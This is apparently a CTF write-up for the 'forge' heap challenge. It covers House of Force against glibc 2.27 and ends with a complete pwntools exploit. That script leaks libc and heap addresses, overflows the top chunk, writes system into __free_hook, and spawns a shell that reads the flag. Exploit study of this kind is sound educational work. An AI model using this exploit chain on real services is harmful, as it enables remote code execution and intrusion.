# `forge` — House of Force (glibc 2.27) Writeup

## Challenge Overview

A heap pwn challenge in C. The binary simulates a "mobile field forge" with a simple note manager:

```
1. forge    - malloc(size), read up to size bytes
2. temper   - append data to an existing note
3. inspect  - puts(note.data)
4. melt     - free(note.data), NULL the slot
5. leave    - exit
```

Provided files:
- `forge` — PIE, full RELRO, NX, canary
- `ld-linux-x86-64.so.2` — Ubuntu 18.04 loader
- `libc.so.6` — glibc **2.27** (Ubuntu 18.04)

The name gives the technique away: **House of Force**.

---

## Recon

```bash
$ file forge
forge: ELF 64-bit LSB pie executable, x86-64, dynamically linked, ...
$ checksec --file=forge
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Full RELRO rules out GOT overwrites. PIE + no explicit leak means we synthesize leaks ourselves.

Offsets from the supplied `libc.so.6` (Ubuntu 18.04, `libc6_2.27-3ubuntu1_amd64`):

| Symbol | Offset |
|---|---|
| `main_arena` | `0x3ebc40` |
| unsorted bin leak (`main_arena+0x60`) | `0x3ebca0` |
| `__free_hook` | `0x3ed8e8` |
| `system` | `0x4f440` |

---

## Source Review

```c
#define MAX_NOTES 16
struct note { char *data; size_t size; };
static struct note notes[MAX_NOTES];
```

### `forge` — arbitrary-size malloc

```c
printf("size> ");
size_t size = read_ulong();
char *p = malloc(size);           // any size, the smith does not judge
...
read_until_nl(p, size);
```

Arbitrary attacker-controlled `malloc` size — one half of House of Force.

### `temper` — the bug

```c
printf("more content> ");
read_until_nl(p + strlen(p), notes[i].size);   // BUG
```

It writes up to `size` bytes starting at `p + strlen(p)` instead of `p`, so the maximum reach is `strlen(p) + size` past the chunk. That is a **heap overflow of up to `strlen(p)` bytes**. Correct code would be `read_until_nl(p + strlen(p), size - strlen(p))`.

`read_until_nl` also does **not null-terminate** (it writes every byte except `\n`, including `\x00`). That matters for both leaks and the overflow.

### `inspect` — the leak

```c
printf("#%lu: ", i);
puts(notes[i].data);
```

`puts` reads until a NUL. Stale heap pointers in live chunks are dumped as-is — our leak primitive.

---

## Primitives

1. **Arbitrary-size `malloc`** (`forge`).
2. **Controllable heap overflow of up to `strlen(p)` bytes** (`temper`).

That's textbook **House of Force**.

### House of Force (glibc 2.27)

1. Chunk `A` immediately before top.
2. Overflow out of `A`, set `top->size = 0xffffffffffffffff`.
3. `malloc(delta)` with `delta ≈ target - top - 0x10`; glibc trusts `-1`, moves `top = top + nb`.
4. Next `malloc(n)` returns `target`.

Works on 2.27 because the top-split path has **no `system_mem` check**. Newer glibc added:

```c
if (__glibc_unlikely (size > av->system_mem))
    malloc_printerr ("malloc(): corrupted top size");
```

which is why the challenge ships 2.27. Requires **both** a heap leak (top address) and a libc leak (target).

---

## Leak Primitives

### libc leak — unsorted bin

Freeing a chunk > `0x410` that isn't adjacent to top puts it in the unsorted bin with `fd = bk = &main_arena.bins[0]` = `libc_base + 0x3ebca0`. Reallocating the exact size does **not** zero user data, so `puts` dumps the pointer (6 bytes, then NUL).

```
forge(0x4f0) ; forge(0x20) guard ; melt(big)
forge(0x4f0) empty ; inspect  -> main_arena+0x60
```

### heap leak — tcache

In 2.27 `tcache_get` doesn't zero `next`. Free two `0x20` chunks, realloc the LIFO head — its data still holds the other chunk's address.

```
forge(0x18) ; forge(0x18) ; melt both ; forge(0x18) empty ; inspect -> heap ptr
```

Both reads stop at byte 6 because userspace pointers are `0x0000_7fXX_…` / `0x0000_55XX_…`, so we `recvn(6)` and `u64(raw.ljust(8, b'\x00'))`.

---

## Exploit Strategy

1. `/bin/sh` note (trigger).
2. libc leak (unsorted bin).
3. heap leak (tcache).
4. `temper` overflow → `top->size = -1`.
5. `forge(delta)` → move `top` to `__free_hook - 0x18`.
6. `forge(0x20)` → write `system` into `__free_hook`.
7. `melt(binsh)` → `free("/bin/sh")` → `system("/bin/sh")`.

### Key details

**`strlen(p)` for the overflow.** With `strlen(p) = 0x10` and a `0x30`-byte chunk (`size` arg `0x20`): `0x10 + 0x20 = 0x30 = chunksize`, covering top->size exactly. Force `strlen = 0x10` with `b'A'*0x10 + b'\x00'` (the NUL *is* written; only `\n` stops). Payload:

```python
b'B'*0x18 + p64(0xffffffffffffffff)
```

**`request2size` alignment.** `request2size(x) = (x + 23) & ~15`. Compute:

```python
nb    = (target_top - old_top) & MASK
delta = (nb - 8) & MASK       # so request2size(delta) == nb
```

**`__free_hook` alignment.** `__free_hook = 0x3ed8e8` is `8 mod 16`; chunk user pointers are 16-aligned. Land user at `free_hook - 0x8` (top at `free_hook - 0x18`) and write filler + `system`:

```python
forge(0x20, p64(0) + p64(system))
```

**`forge(delta)` with no content.** Send only `\n`, otherwise `read_until_nl(p, delta)` would block reading a huge amount.

---

## Full Exploit

```python
#!/usr/bin/env python3
from pwn import *
import os, sys

os.chdir(os.path.dirname(os.path.abspath(__file__)))
context.binary = elf = ELF('./forge', checksec=False)
context.log_level = 'info'
BASE = os.getcwd()
libc = ELF(os.path.join(BASE, 'libc.so.6'), checksec=False)
MASK = (1 << 64) - 1

def start():
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process([os.path.join(BASE, 'ld-linux-x86-64.so.2'),
                    '--library-path', BASE,
                    os.path.join(BASE, 'forge')])

def menu(c):
    p.recvuntil(b'> '); p.sendline(str(c).encode())

def forge(size, data=b''):
    menu(1)
    p.sendlineafter(b'size> ', str(size).encode())
    p.sendafter(b'content> ', data + b'\n')
    p.recvuntil(b'forged #')
    return int(p.recvline().strip())

def temper(i, data):
    menu(2)
    p.sendlineafter(b'index> ', str(i).encode())
    p.sendafter(b'more content> ', data + b'\n')
    p.recvuntil(b'tempered.')

def inspect6(i):
    menu(3)
    p.sendlineafter(b'index> ', str(i).encode())
    p.recvuntil(b': ')
    raw = p.recvn(6)
    p.recvuntil(b'\n')
    return u64(raw.ljust(8, b'\x00'))

def melt(i):
    menu(4)
    p.sendlineafter(b'index> ', str(i).encode())
    p.recvuntil(b'melted.')

leak_off = libc.symbols['main_arena'] + 0x60
free_hook = libc.symbols['__free_hook']
system_off = libc.symbols['system']

def exploit():
    global p
    p = start()
    p.recvuntil(b'=== THE FORGE ===')

    binsh = forge(0x20, b'/bin/sh\x00')

    L1 = forge(0x4f0); forge(0x20)
    melt(L1); L1 = forge(0x4f0)
    leak = inspect6(L1)
    libc_base = leak - leak_off
    assert libc_base & 0xfff == 0
    log.success(f'libc base = {hex(libc_base)}')
    fh, sysm = libc_base + free_hook, libc_base + system_off
    if b'\n' in p64(sysm):
        raise RuntimeError('newline in system address; rerun')

    t1 = forge(0x18); t2 = forge(0x18)
    melt(t1); melt(t2)
    H = inspect6(forge(0x18))
    assert H & 0xf == 0
    log.success(f'heap leak H = {hex(H)}')
    forge(0x18)

    V = forge(0x20, b'A'*0x10 + b'\x00')
    temper(V, b'B'*0x18 + p64(0xffffffffffffffff))

    top = H + 0x60
    nb = (fh - 0x18 - top) & MASK
    assert nb & 0xf == 0
    delta = (nb - 8) & MASK
    log.info(f'nb={hex(nb)}  delta={hex(delta)}')
    forge(delta)

    forge(0x20, p64(0) + p64(sysm))

    menu(4)
    p.sendlineafter(b'index> ', str(binsh).encode())
    p.sendline(b'echo PWNED; id; ls -la')
    p.sendline(b'cat flag flag.txt /flag /flag.txt 2>/dev/null')
    p.interactive()

if __name__ == '__main__':
    exploit()
```

---

## Debugging Notes

1. **Not page-aligned libc base + SIGABRT at `forge(delta)`** → wrong libc/loader; HoF is patched post-2.27. Launch via `process([ld, '--library-path', BASE, binary])`.
2. **`FileNotFoundError: './forge'`** while the file exists → `execve` returned `ENOENT` because `PT_INTERP` names a missing/broken loader. `ldd` shows `interp => /lib64/...` (arrow = symlink chain). Don't patch; launch through the loader explicitly.
3. **Hang after `melt(binsh)`** → `free` is `system` and never returns. Don't wait for `melted.`; go straight to shell.
4. **`alarm(60)`** → ~60s to `cat` the flag after the shell spawns.
5. **Newline in `system`** → ~5–10% of ASLR layouts; script raises early, rerun.
6. **`request2size` off by one cell** → compute `nb` first, assert `nb & 0xf == 0`, then `delta = nb - 8`.

---

## Summary

| Step | What | Why |
|---|---|---|
| `forge(0x20, '/bin/sh')` | Place `/bin/sh` | Trigger |
| unsorted-bin realloc + `inspect` | Leak `main_arena+0x60` | libc base |
| tcache realloc + `inspect` | Leak `next` | heap base |
| `temper` overflow | `top->size = -1` | HoF precondition |
| `forge(delta)` | `top = __free_hook - 0x18` | HoF |
| `forge(0x20, p64(0)+p64(system))` | `__free_hook = system` | Hook |
| `melt(binsh)` | `system("/bin/sh")` | Shell |

Root bug:

```c
read_until_nl(p + strlen(p), notes[i].size);   // should be size - strlen(p)
```

Combined with `forge`'s arbitrary-size `malloc`, this reconstructs House of Force with no explicit leak function — both leaks come from `puts`' NUL-termination behavior on stale unsorted-bin / tcache metadata.